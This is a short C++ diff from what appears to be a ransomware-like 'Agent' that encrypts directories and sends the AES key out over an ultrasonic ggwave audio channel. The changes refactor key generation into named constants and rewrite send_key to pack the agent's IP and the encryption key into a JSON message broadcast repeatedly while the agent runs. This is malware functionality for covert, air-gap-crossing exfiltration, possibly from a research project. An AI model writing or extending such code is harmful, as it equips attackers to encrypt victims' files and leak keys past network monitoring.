@@ -90,14 +90,15 @@ void Agent::encrypt_directory(const std::array<byte, AES::DEFAULT_KEYLENGTH>& en
 
 std::array<byte, AES::DEFAULT_KEYLENGTH> Agent::generate_key()
 {
+	constexpr uint32_t MAX_BYTE_VALUE = 122;
+	constexpr uint32_t MIN_BYTE_VALUE = 48;
 	AutoSeededRandomPool rng{};
 	std::array<byte, AES::DEFAULT_KEYLENGTH> key{};
 
 	for ( uint32_t i = 0; i< key.size(); ++i )
 	{
-		key[i] = (rng.GenerateByte() % (122 - 48 + 1)) + 48;
+		key[i] = (rng.GenerateByte() % (MAX_BYTE_VALUE - MIN_BYTE_VALUE + 1)) + MIN_BYTE_VALUE;
 	}
-	//rng.GenerateBlock(key.data(), key.size());
 
 	return key;
 }
@@ -119,7 +120,7 @@ void Agent::send_key(const std::array<byte, AES::DEFAULT_KEYLENGTH>& encryption_
 	constexpr int TX_PROTOCOL = GGWAVE_TX_PROTOCOL_ULTRASOUND_FASTEST;
 	constexpr int VOLUME = 10;
 	
-	std::string encryption_data = "key: {" + std::string(encryption_key.begin(), encryption_key.end()) + "}"; //"{ \"agentIp\": \"10.10.10.55\", \"content\" : \"{\\\"EncryptionKey\\\":\\\"cQfTjWnZr4u7x!A%D*F-JaNdRgUkXp2s\\\"}\" }"; //"key: {" + std::string(encryption_key.begin(), encryption_key.end()) + "} vi: {" + std::string(m_init_vector.begin(), m_init_vector.end()) + "}";
+	std::string encryption_data = "{ \"agentIp\": \"10.0.0.5\", \"content\" : \"{\\\"EncryptionKey\\\":\\\"" + std::string(encryption_key.begin(), encryption_key.end()) +"\\\"}\" }";
 	auto ggWave = m_ultrasonic.get_ggwave();
 
 	while (m_agent_running) {
